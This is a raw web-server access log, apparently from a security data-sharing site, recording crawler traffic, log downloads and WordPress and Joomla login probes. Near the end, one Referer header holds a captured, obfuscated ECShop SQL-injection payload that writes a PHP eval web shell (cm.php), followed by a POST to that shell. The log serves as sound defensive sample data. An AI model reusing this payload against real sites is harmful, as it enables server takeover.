101.175.18.100 - - [07/Sep/2018:18:42:15 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
216.244.66.245 - - [07/Sep/2018:18:42:45 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
52.14.175.39 - - [07/Sep/2018:18:43:48 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Chrome/67.0.3396.79 Safari/537.36" 
216.244.66.245 - - [07/Sep/2018:18:57:41 -0700] "GET /self.logs/error.log.2017-12-02.gz HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.26 - - [07/Sep/2018:19:00:27 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.173 - - [07/Sep/2018:19:01:06 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
112.120.124.160 - - [07/Sep/2018:19:02:08 -0700] "GET / HTTP/1.1" 200 12346 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
112.120.124.160 - - [07/Sep/2018:19:02:09 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27751 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
112.120.124.160 - - [07/Sep/2018:19:02:09 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7391 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
112.120.124.160 - - [07/Sep/2018:19:02:13 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 553 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
60.51.24.57 - - [07/Sep/2018:19:03:32 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
60.51.24.57 - - [07/Sep/2018:19:03:32 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
60.51.24.57 - - [07/Sep/2018:19:03:32 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
60.51.24.57 - - [07/Sep/2018:19:03:33 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
207.46.13.26 - - [07/Sep/2018:19:04:05 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
18.188.94.118 - - [07/Sep/2018:19:13:48 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Safari/602.1" 
207.46.13.26 - - [07/Sep/2018:19:18:32 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 301 515 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.26 - - [07/Sep/2018:19:18:37 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [07/Sep/2018:19:19:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
216.244.66.245 - - [07/Sep/2018:19:26:31 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
52.212.146.96 - - [07/Sep/2018:19:30:01 -0700] "GET /self.logs/access.log.2018-09-01.gz HTTP/1.1" 200 22573 "-" "python-requests/2.12.1" 
52.212.146.96 - - [07/Sep/2018:19:30:02 -0700] "GET /self.logs/access.log.2018-09-02.gz HTTP/1.1" 200 20399 "-" "python-requests/2.12.1" 
52.212.146.96 - - [07/Sep/2018:19:30:02 -0700] "GET /self.logs/access.log.2018-09-03.gz HTTP/1.1" 200 21587 "-" "python-requests/2.12.1" 
52.212.146.96 - - [07/Sep/2018:19:30:02 -0700] "GET /self.logs/access.log.2018-09-04.gz HTTP/1.1" 200 35467 "-" "python-requests/2.12.1" 
52.212.146.96 - - [07/Sep/2018:19:30:02 -0700] "GET /self.logs/access.log.2018-09-05.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [07/Sep/2018:19:30:03 -0700] "GET /self.logs/access.log.2018-09-06.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
52.212.146.96 - - [07/Sep/2018:19:30:03 -0700] "GET /self.logs/access.log.2018-09-07.gz HTTP/1.1" 404 340 "-" "python-requests/2.12.1" 
106.39.0.73 - - [07/Sep/2018:19:30:23 -0700] "GET / HTTP/1.1" 301 483 "http://www.freebuf.com/articles/network/131279.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17738" 
106.39.0.73 - - [07/Sep/2018:19:30:24 -0700] "GET / HTTP/1.1" 200 12383 "http://www.freebuf.com/articles/network/131279.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17738" 
106.39.0.73 - - [07/Sep/2018:19:30:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17738" 
106.39.0.73 - - [07/Sep/2018:19:30:24 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17738" 
106.39.0.73 - - [07/Sep/2018:19:30:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17738" 
58.173.95.137 - - [07/Sep/2018:19:34:23 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
58.173.95.137 - - [07/Sep/2018:19:34:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
58.173.95.137 - - [07/Sep/2018:19:34:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
58.173.95.137 - - [07/Sep/2018:19:34:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
216.244.66.245 - - [07/Sep/2018:19:41:07 -0700] "GET /self.logs/access.log.2018-05-29.gz HTTP/1.1" 200 33420 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
18.219.142.57 - - [07/Sep/2018:19:43:37 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
186.18.32.158 - - [07/Sep/2018:19:45:07 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
186.18.32.158 - - [07/Sep/2018:19:45:07 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
181.53.169.210 - - [07/Sep/2018:19:51:13 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
181.53.169.210 - - [07/Sep/2018:19:51:13 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
162.210.196.129 - - [07/Sep/2018:19:55:02 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [07/Sep/2018:19:55:04 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
99.98.181.79 - - [07/Sep/2018:19:56:53 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
99.98.181.79 - - [07/Sep/2018:19:56:53 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
99.98.181.79 - - [07/Sep/2018:19:56:53 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
99.98.181.79 - - [07/Sep/2018:19:56:55 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
40.77.167.181 - - [07/Sep/2018:20:01:40 -0700] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 12014 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
180.163.220.5 - - [07/Sep/2018:20:07:29 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
180.163.220.5 - - [07/Sep/2018:20:07:29 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
180.163.220.66 - - [07/Sep/2018:20:07:29 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
190.142.253.14 - - [07/Sep/2018:20:09:16 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 532900 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0" 
216.244.66.245 - - [07/Sep/2018:20:10:06 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
18.219.142.57 - - [07/Sep/2018:20:13:56 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Safari/602.1" 
207.46.13.224 - - [07/Sep/2018:20:17:22 -0700] "GET /self.logs/access.log.2017-08-06.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
211.141.181.202 - - [07/Sep/2018:20:22:25 -0700] "GET /favicon.ico HTTP/1.1" 301 501 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
211.141.181.202 - - [07/Sep/2018:20:22:26 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
216.244.66.245 - - [07/Sep/2018:20:24:31 -0700] "GET /self.logs/access.log.2018-05-30.gz HTTP/1.1" 200 24129 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
113.171.224.176 - - [07/Sep/2018:20:25:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
46.119.115.162 - - [07/Sep/2018:20:25:49 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://bitmaein.com/shop" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Deepnet Explorer 1.5.0; .NET CLR 1.0.3705)" 
211.141.181.202 - - [07/Sep/2018:20:32:55 -0700] "GET /favicon.ico HTTP/1.1" 301 501 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
211.141.181.202 - - [07/Sep/2018:20:32:56 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
113.116.90.91 - - [07/Sep/2018:20:34:08 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
106.39.0.125 - - [07/Sep/2018:20:38:12 -0700] "GET / HTTP/1.1" 301 483 "http://www.freebuf.com/articles/network/131279.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
106.39.0.125 - - [07/Sep/2018:20:38:13 -0700] "GET / HTTP/1.1" 200 12383 "http://www.freebuf.com/articles/network/131279.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
106.39.0.125 - - [07/Sep/2018:20:38:13 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
106.39.0.125 - - [07/Sep/2018:20:38:13 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
17.58.100.204 - - [07/Sep/2018:20:40:57 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.204 - - [07/Sep/2018:20:40:57 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.204 - - [07/Sep/2018:20:40:57 -0700] "GET / HTTP/1.1" 301 482 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.204 - - [07/Sep/2018:20:40:57 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.58.100.204 - - [07/Sep/2018:20:40:57 -0700] "GET / HTTP/1.1" 200 12382 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET / HTTP/1.1" 200 46211 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET /xmlrpc.php?rsd HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET /blog/robots.txt HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET /blog/ HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET /wordpress/ HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET /wp/ HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:42 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:43 -0700] "GET /administrator/index.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:43 -0700] "GET /blog/robots.txt HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:43 -0700] "GET /blog/administrator/index.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:43 -0700] "GET /joomla/robots.txt HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
95.211.211.232 - - [07/Sep/2018:20:42:43 -0700] "GET /joomla/administrator/index.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32" 
18.219.142.57 - - [07/Sep/2018:20:44:11 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Chrome/67.0.3396.79 Safari/537.36" 
90.95.88.35 - - [07/Sep/2018:20:45:16 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
90.95.88.35 - - [07/Sep/2018:20:45:17 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
213.149.51.177 - - [07/Sep/2018:20:47:01 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
123.120.30.169 - - [07/Sep/2018:20:55:27 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6726.400 QQBrowser/10.2.2265.400" 
123.120.30.169 - - [07/Sep/2018:20:55:28 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6726.400 QQBrowser/10.2.2265.400" 
123.120.30.169 - - [07/Sep/2018:20:55:28 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6726.400 QQBrowser/10.2.2265.400" 
123.120.30.169 - - [07/Sep/2018:20:55:33 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6726.400 QQBrowser/10.2.2265.400" 
58.246.221.61 - - [07/Sep/2018:20:56:27 -0700] "GET / HTTP/1.1" 200 46212 "blank" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" 
207.46.13.242 - - [07/Sep/2018:20:57:13 -0700] "GET /self.logs/error.log.2017-09-11.gz HTTP/1.1" 200 1237 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.11.154.104 - - [07/Sep/2018:20:57:31 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e YisouSpider/5.0 Safari/602.1" 
123.120.30.169 - - [07/Sep/2018:20:57:42 -0700] "GET /data HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6726.400 QQBrowser/10.2.2265.400" 
116.128.128.79 - - [07/Sep/2018:20:58:42 -0700] "GET /data HTTP/1.1" 404 295 "blank" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; rv:11.0) like Gecko" 
154.238.183.198 - - [07/Sep/2018:20:59:57 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
154.238.183.198 - - [07/Sep/2018:20:59:57 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
37.9.87.180 - - [07/Sep/2018:21:04:59 -0700] "GET /robots.txt HTTP/1.1" 301 517 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
37.9.87.180 - - [07/Sep/2018:21:04:59 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.85.128 - - [07/Sep/2018:21:05:03 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.85.128 - - [07/Sep/2018:21:05:03 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
40.77.167.181 - - [07/Sep/2018:21:05:08 -0700] "GET /data HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.224 - - [07/Sep/2018:21:09:33 -0700] "GET /self.logs/access.log.2017-12-05.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
18.191.165.71 - - [07/Sep/2018:21:14:06 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/602.1" 
114.116.26.211 - - [07/Sep/2018:21:20:17 -0700] "GET //user.php HTTP/1.1" 404 340 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a324e744c6e426f634363734a7a772f63476877494756325957776f4a46395154314e5557324e745a4630704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X" 
114.116.26.211 - - [07/Sep/2018:21:20:17 -0700] "POST //cm.php HTTP/1.1" 404 309 "http://www.secrepo.com//cm.php" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" 
113.171.224.176 - - [07/Sep/2018:21:27:14 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
101.164.197.106 - - [07/Sep/2018:21:29:28 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
